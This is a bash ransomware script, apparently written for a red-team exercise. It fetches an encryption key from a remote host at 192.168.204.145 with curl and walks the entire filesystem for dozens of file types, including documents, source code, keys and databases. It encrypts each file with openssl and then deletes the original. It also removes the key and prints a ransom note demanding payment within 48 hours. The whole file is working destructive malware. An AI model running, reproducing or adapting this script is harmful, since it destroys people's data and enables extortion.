#!/bin/bash

fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" \
          "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
          "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" \
          "*.propertis" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
          "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" \
          "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
          "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" \
          "*.flv" "*.mp4" "*.mp3" "*.wav" "*.mov" "*.ogg" "*.md" \
          "*.yaml" "*.pem" "*.gpg" "*.sql" "*.vim" "*.csv" "*.bak")

mkdir -p /tmp/.../
cd /tmp/.../

curl http://192.168.204.145:8080/pub.pem > ./pub.pem
curl http://192.168.204.145:8080/key.bin > ./key.bin

chmod 755 ./pub.pem
chmod 755 ./key.bin

for ((num=0; num<"${#fileExts[@]}"; num++))
do
  for file in $(find / -name "${fileExts[${num}]}")
  do 
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin

    rm -rf ${file}
  done
done

rm -rf /tmp/.../key.bin

echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, contact red team. We accept beer, food, and BTC. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
